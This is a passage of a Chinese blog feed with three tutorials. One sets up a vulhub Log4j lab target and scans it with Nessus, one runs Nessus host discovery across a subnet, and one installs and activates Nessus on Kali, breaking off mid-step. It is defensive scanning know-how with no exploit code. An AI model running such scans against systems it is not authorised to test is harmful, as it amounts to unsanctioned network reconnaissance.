            "id": "https://mangpumo.github.io/2023/01/11/Nessus%E6%89%AB%E6%8F%8Flog4J%E6%BC%8F%E6%B4%9E/",
            "url": "https://mangpumo.github.io/2023/01/11/Nessus%E6%89%AB%E6%8F%8Flog4J%E6%BC%8F%E6%B4%9E/",
            "title": "Nessus扫描log4J漏洞",
            "date_published": "2023-01-10T21:38:46.000Z",
            "content_html": "<h1 id=\"nessus-扫描log4j漏洞\"><a class=\"anchor\" href=\"#nessus-扫描log4j漏洞\">#</a> Nessus 扫描 log4J 漏洞</h1>\n<h2 id=\"1扫描环境搭建\"><a class=\"anchor\" href=\"#1扫描环境搭建\">#</a> 1. 扫描环境搭建</h2>\n<h5 id=\"1centos7-安装装宝塔面板\"><a class=\"anchor\" href=\"#1centos7-安装装宝塔面板\">#</a> 1.centos7 安装装宝塔面板</h5>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/0441e1bbb16a4097a848d126df6ad17a.png\" alt=\"image.png\"></p>\n<h5 id=\"2面板里下载docker\"><a class=\"anchor\" href=\"#2面板里下载docker\">#</a> 2. 面板里下载 docker</h5>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/de849a33389c490bb17d0eac6a96fecb.png\" alt=\"image.png\"></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/519f4443f1814959b11df6d88aac4145.png\" alt=\"image.png\"></p>\n<h5 id=\"3进入centos检查docker是否生效\"><a class=\"anchor\" href=\"#3进入centos检查docker是否生效\">#</a> 3. 进入 centos 检查 docker 是否生效</h5>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker --version</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"4安装docker-compose\"><a class=\"anchor\" href=\"#4安装docker-compose\">#</a> 4. 安装 docker-compose</h5>\n<p>Docker Compose 是一个用来定义和运行复杂应用的 Docker 工具。一个使用 Docker 容器的应用，通常由多个容器组成。使用 Docker Compose 不再需要使用 shell 脚本来启动容器。</p>\n<p>Compose 通过一个配置文件来管理多个 Docker 容器，在配置文件中，所有的容器通过 services 来定义，然后使用 docker-compose 脚本来启动，停止和重启应用，和应用中的服务以及所有依赖服务的容器，非常适合组合使用多个容器进行开发的场景。</p>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vY29tcG9zZS9pbnN0YWxsLw==\">https://docs.docker.com/compose/install/</span></p>\n<p>4.1 下载 docker-compose</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -L &quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/021b03ca8c80487f9195adc1109febbd.png\" alt=\"image.png\"></p>\n<p>4.2 查看 docker-compose</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls /usr/local/bin/</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/07d926dcfd0d42d99b24743b674def58.png\" alt=\"image.png\"></p>\n<p>4.3 给 docker-compose 目录增加可执行权限</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod +x /usr/local/bin/docker-compose</span><br><span class=\"line\">ls /usr/local/bin/</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/1a52eca9ba98451e9944261df831b9e1.png\" alt=\"image.png\"></p>\n<p>4.4 查看版本</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose -version</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/2e178bf8083d40e8a8a2a4626dce321a.png\" alt=\"image.png\"></p>\n<h5 id=\"5安装vulhub\"><a class=\"anchor\" href=\"#5安装vulhub\">#</a> 5. 安装 vulhub</h5>\n<p>5.1 创建 zsoft 文件夹</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /www/wwwroot/</span><br><span class=\"line\">ls</span><br><span class=\"line\">mkdir softs</span><br><span class=\"line\">ls</span><br><span class=\"line\">cd softs</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/100e72d253494a77865a0ef28e3853e0.png\" alt=\"image.png\"></p>\n<p>5.2 下载 vulhub, 并查看</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/vulhub/vulhub.git</span><br><span class=\"line\">ls</span><br><span class=\"line\">cd vulhub</span><br><span class=\"line\">ls</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/f07e9e024a4845c3b9b041e2e551536d.png\" alt=\"image.png\"></p>\n<h5 id=\"6部署log4j靶场\"><a class=\"anchor\" href=\"#6部署log4j靶场\">#</a> 6. 部署 log4J 靶场</h5>\n<p>6.1 进入 log4j/CVE-2021-44228</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd log4j/CVE-2021-44228</span><br><span class=\"line\">ls</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/dac22ab5392b42ceb89fdb2d04f1f6cf.png\" alt=\"image.png\"></p>\n<p>6.2 编译环境</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose build</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/8826d479399247d19cac4368b5584a13.png\" alt=\"image.png\"></p>\n<p>6.3 运行环境</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose up -d</span><br></pre></td></tr></table></figure></p>\n<p>6.4 查看端口</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose ps</span><br><span class=\"line\">docker ps</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/99dbccec16e8460cb65771e03b010197.png\" alt=\"image.png\"></p>\n<p>6.5 查看 ip</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip a</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/b864d9f810564857a93c5eb342240344.png\" alt=\"image.png\"></p>\n<p>6.6 宝塔面板放行端口</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5398f901945340fb9f0531283655dd15.png\" alt=\"image.png\"></p>\n<p>6.7 访问靶场地址</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.110.198:8983</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/f19a24723ea74f90bfbd516c97ac17fc.png\" alt=\"image.png\"></p>\n<h2 id=\"2扫描log4j漏洞\"><a class=\"anchor\" href=\"#2扫描log4j漏洞\">#</a> 2. 扫描 log4J 漏洞</h2>\n<h3 id=\"1log4jshell扫描\"><a class=\"anchor\" href=\"#1log4jshell扫描\">#</a> 1.log4Jshell 扫描</h3>\n<p>1. 访问 nessus 扫描网站</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://192.168.110.230:8834/#/</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5312ef585b90494393ac1c3836733512.png\" alt=\"image.png\"></p>\n<p>2. 登录后，点击【新增扫描】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/d7b219844c3d4be4a870a9172bd1a0c8.png\" alt=\"image.png\"></p>\n<p>3. 选择【Log4Shell】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/879dab939e1948fe88055cce194c4472.png\" alt=\"image.png\"></p>\n<p>4. 输入 Name【log4jshell】，目标【192.168.110.198】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/2c9bafcb837e4b10acdfe1796110af16.png\" alt=\"image.png\"></p>\n<p>5. 点击【发现】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/54e3442117ad4a51808430dcd3d9004a.png\" alt=\"image.png\"></p>\n<p>6. 选择扫描类型【彻底】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/27cc3ab79bf54b9da3af319a2d8ed9ff.png\" alt=\"image.png\"></p>\n<p>7. 点击【评估】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/249465aabe16419b9480bc51108f7922.png\" alt=\"image.png\"></p>\n<p>8. 选择扫描类型【默认】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/1be69e69dc224a41bab404c4918e0e4f.png\" alt=\"image.png\"></p>\n<p>9. 点击【证书】, 点击【ssh】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/e39419bb80074bfc9a6f0173912c924d.png\" alt=\"image.png\"></p>\n<p>10. 选择身份验证方法【密码】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/ae7649df348d424397281fcfb273e6d0.png\" alt=\"image.png\"></p>\n<p>11. 输入被扫描服务器的用户名【root】，密码【root】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/20a706aa71c149f988c2bd3a0a8c91d1.png\" alt=\"image.png\"></p>\n<p>12. 点击【插件】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/d55fa35e69ea42768a03f1513c35f1ef.png\" alt=\"image.png\"></p>\n<p>13. 点击【保存】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/f9ea1593922343a58b2ce767e674cdf0.png\" alt=\"image.png\"></p>\n<p>14. 执行【log4shell】扫描</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/d7721cd40f2d4817b55c50dccb64b0b5.png\" alt=\"image.png\"></p>\n<p>15. 查看 log4J 的扫描结果</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/366adf34bbb8440ba60b270fdcf51d87.png\" alt=\"image.png\"></p>\n<h3 id=\"2nesuss扫描log4shell-漏洞生态系统\"><a class=\"anchor\" href=\"#2nesuss扫描log4shell-漏洞生态系统\">#</a> 2.nesuss 扫描 Log4Shell 漏洞生态系统</h3>\n<p>1. 访问 nessus 扫描网站</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly8xOTIuMTY4LjExMC4yMzA6ODgzNC8jLw==\">https://192.168.110.230:8834/#/</span></p>\n<p>2. 点击新建扫描</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/3e85bf0e4380479b8df37afeb85973e5.png\" alt=\"image.png\"></p>\n<p>3. 选择【Log4Shell 漏洞生态系统】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/24fc6288d71340efae4d97bd5ad9f870.png\" alt=\"image.png\"></p>\n<p>4. 输入 Name【log4jshell 生态】，目标【192.168.110.198】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5fe55d20097c458db27204caad1b22af.png\" alt=\"image.png\"></p>\n<p>5. 点击【发现】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5b8e5e6b086742fe85a816475ef782bc.png\" alt=\"image.png\"></p>\n<p>6. 选择扫描类型【彻底】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/525da2c8e3684e69a3e7ebde40302d61.png\" alt=\"image.png\"></p>\n<p>7. 点击【评估】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/99012fc379dd4e27aec5c0a4e3f2c1f8.png\" alt=\"image.png\"></p>\n<p>8. 选择扫描类型【默认】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/4ea0cce3414643abb0cce510e0b882b4.png\" alt=\"image.png\"></p>\n<p>9. 点击【证书】, 点击【ssh】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/7c20e6d3e7824e95ba02c85bc7722628.png\" alt=\"image.png\"></p>\n<p>10. 点击【插件】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/741be19fc5044b4c84da53ecdf6bab9f.png\" alt=\"image.png\"></p>\n<p>11. 点击【保存】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5e45a982324f4b14a7c17e016f0c5b9f.png\" alt=\"image.png\"></p>\n<p>12. 执行【log4shell 生态】扫描</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/fc08c461762b4f96aa936946747c4e05.png\" alt=\"image.png\"></p>\n<p>13. 查看 log4J 生态的扫描结果</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/3192b68ad96e4e9aaaff70e36b057477.png\" alt=\"image.png\"></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/11/NessusHostDiscovery/",
            "url": "https://mangpumo.github.io/2023/01/11/NessusHostDiscovery/",
            "title": "NessusHostDiscovery",
            "date_published": "2023-01-10T21:38:08.000Z",
            "content_html": "<h1 id=\"nessus-host-discovery\"><a class=\"anchor\" href=\"#nessus-host-discovery\">#</a> Nessus Host Discovery</h1>\n<p>1. 启动 nessus</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd nessus</span><br><span class=\"line\">sh qd_nessus.sh</span><br></pre></td></tr></table></figure></p>\n<p>2. 进入 nessus 网站</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://192.168.3.47:8834/</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/7ab2d5aa1c7a436d9a4236390971d873.png\" alt=\"image.png\"></p>\n<p>3. 点击【New Scan】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/ae91d3e49a014ce4bf5d16e14d4c009a.png\" alt=\"image.png\"></p>\n<p>4. 选择【Host Discovery】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/6314833fd6b24fc482bbf884bdeb3bd4.png\" alt=\"image.png\"></p>\n<p>5. 输入 name【主机发现】，Description【主机发现】，Targets【192.168.3.0/24】, 点击【Save】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/9af5119ff47a41ef9f14fc1edd751799.png\" alt=\"image.png\"></p>\n<p>6. 点击【 Schedule】</p>\n<p>这里是配置定时任务的，可以忽略</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/32d9e17742fa4afb8942d1cf5db96ba6.png\" alt=\"image.png\"></p>\n<p>7. 点击【 Notifications】</p>\n<p>这里主要是配置邮件提醒的，可以配置也可以忽略</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/c65ec8c79ceb4e16a91630ce6bfcddf5.png\" alt=\"image.png\"></p>\n<p>8. 点击【Discovery 】</p>\n<p>这里选择常用端口扫描</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/7c9a0ee9cc2b48bfa166e80f991819c5.png\" alt=\"image.png\"></p>\n<p>9. 点击【Report 】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/a768bfa493014b299c4cf4aca1346474.png\" alt=\"image.png\"></p>\n<p>10. 点击【Advanced 】</p>\n<p>这里是高级设置选项</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/07171ac22bdb481a97298199b7a36636.png\" alt=\"image.png\"></p>\n<p>11. 点击【Plugins】</p>\n<p>这里是配置插件的地方，主机发现不要配置插件</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/1b538e5621c64332a3ee06cd862080b0.png\" alt=\"image.png\"></p>\n<p>12. 点击【保存】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/193ae3a3dbd145b88480bb71deb6e721.png\" alt=\"image.png\"></p>\n<p>13. 点击【主机发现】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/2fe3b92bf40640bea04bc8ecbb12a487.png\" alt=\"image.png\"></p>\n<p>14. 点击【More】，点击【Launch】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/7abedbdf5cb94f9faafa11eec2017cca.png\" alt=\"image.png\"></p>\n<p>15. 点击【Launch】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/bda6368a8f0a48d5a42370ce5a7bf537.png\" alt=\"image.png\"></p>\n<p>16. 点击【主机发现】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/de021dcff58f431c9ceee57cd0354fae.png\" alt=\"image.png\"></p>\n<p>17. 查看扫描结果</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/a9678c7f935a4213bfdd401d11ed91ae.png\" alt=\"image.png\"></p>\n<p>18. 选择其中一个主机查看</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/0a1af822d924498bb1c20ed9a3675b4e.png\" alt=\"image.png\"></p>\n<p>19. 查看具体的扫描结果</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1647250261071/c8b48d3a6f4241d6a9be2a6bf3b678e3.png\" alt=\"image.png\"></p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/11/Nessus%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%AE%89%E8%A3%85/",
            "url": "https://mangpumo.github.io/2023/01/11/Nessus%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%AE%89%E8%A3%85/",
            "title": "Nessus介绍与安装",
            "date_published": "2023-01-10T21:37:04.000Z",
            "content_html": "<h1 id=\"nessus介绍与安装\"><a class=\"anchor\" href=\"#nessus介绍与安装\">#</a> Nessus 介绍与安装</h1>\n<h2 id=\"1nessus简介\"><a class=\"anchor\" href=\"#1nessus简介\">#</a> 1.Nessus 简介</h2>\n<p>Nessus 号称是世界上最流行的漏洞扫描程序，全世界有超过 75000 个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus 不同于传统的漏洞扫描软件，Nessus 可同时在本机或远端上遥控，进行系统的漏洞分析扫描。Nessus 也是渗透测试重要工具之一</p>\n<h2 id=\"2kali安装nessus\"><a class=\"anchor\" href=\"#2kali安装nessus\">#</a> 2.kali 安装 Nessus</h2>\n<p>1. 访问 Nessus 官网</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.tenable.com/downloads/nessus</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/1dde7c7b4ec645cba3c61b1e8a5ca73f.png\" alt=\"image.png\"></p>\n<p>或者下载课程资料里的安装包【Nessus-10.1.1-debian6_amd64.deb】到 kali</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/22505ff746a648c397bf5dc2cef5a7a2.png\" alt=\"image.png\"></p>\n<p>2. 安装 Nessus 程序</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpkg -i Nessus-10.1.1-debian6_amd64.deb </span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/071d1f15c17c42f381975763adf711d0.png\" alt=\"image.png\"></p>\n<p>You can start Nessus Scanner by typing /bin/systemctl start nessusd.service 启动服务命令</p>\n<p>Then go to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9rYWxpOjg4MzQv\">https://kali:8834/</span>to configure your scanner  访问地址</p>\n<p>3. 启动 Nessus</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service nessusd start</span><br></pre></td></tr></table></figure></p>\n<p>4. 查看 kali 的 ip</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip a</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/f892a26fccf8481fa9f5f687c26c1a58.png\" alt=\"image.png\"></p>\n<p>5. 浏览器访问 nessus 的 web 网站</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://192.168.11.75:8834/#/</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/d7e0366737ee4e91b5e16b403792ae4b.png\" alt=\"image.png\"></p>\n<p>6. 选择 【Managed Scanner】选项，点击【Continue】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/f8c1d51f75694259b6a4cd4ce504dfea.png\" alt=\"image.png\"></p>\n<p>7. 选择【<span class=\"exturl\" data-url=\"aHR0cDovL1RlbmFibGUuc2M=\">Tenable.sc</span>】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/80ba631a892e4a089673aedb0df08804.png\" alt=\"image.png\"></p>\n<p>8. 点击【Continue】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/3f4f08d4a8544277ae02f174a8e62ecc.png\" alt=\"image.png\"></p>\n<p>9. 输入用户名【admin】，输入密码【123456】，点击【Submit】</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/8021cf24bd45404eaeba0b0fae793bd5.png\" alt=\"image.png\"></p>\n<p>10. 等待配置插件</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/86313f9a1137476c8a1a0d023c89069b.png\" alt=\"image.png\"></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1646044171048/565d98fe895c431eb8504e1814f9403d.png\" alt=\"image.png\"></p>\n<p>安装完成后是这样的界面，尚未激活，不能扫描，此时只有一个设置按钮，并无扫描按钮.</p>\n<h2 id=\"3离线激活nessus\"><a class=\"anchor\" href=\"#3离线激活nessus\">#</a> 3. 离线激活 Nessus</h2>\n<ol>\n<li>去 nessus 官方申请激活码，姓名随便填，邮箱必须正确，用来接收激活码</li>\n</ol>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://zh-cn.tenable.com/products/nessus/nessus-essentials</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/2e042a1b3bc24ebe96668f68b6ccd487.png\" alt=\"image.png\"></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/b89303b62eee43bc99b9d7c3739212f2.png\" alt=\"image.png\"></p>\n<p>2. 进入填写的邮箱获取激活码</p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/9b2d9202c94c4da080936d485a3c2c83.png\" alt=\"image.png\"></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/24bf49a1d16e4261a1d30d92ec805d5b.png\" alt=\"image.png\"></p>\n<p>3. 获得质询码（challenge code）</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/opt/nessus/sbin/nessuscli fetch  --challenge</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/97008ee858754d229d82981cc26b7a62.png\" alt=\"image.png\"></p>\n<p>4. 获取离线插件包地址及激活证书</p>\n<p>浏览器打开网页 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wbHVnaW5zLm5lc3N1cy5vcmcvdjIvb2ZmbGluZS5waHA=\">https://plugins.nessus.org/v2/offline.php</span> ，输入申请的激活码，以及上一步得到的质询码，点击【Submit】</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span 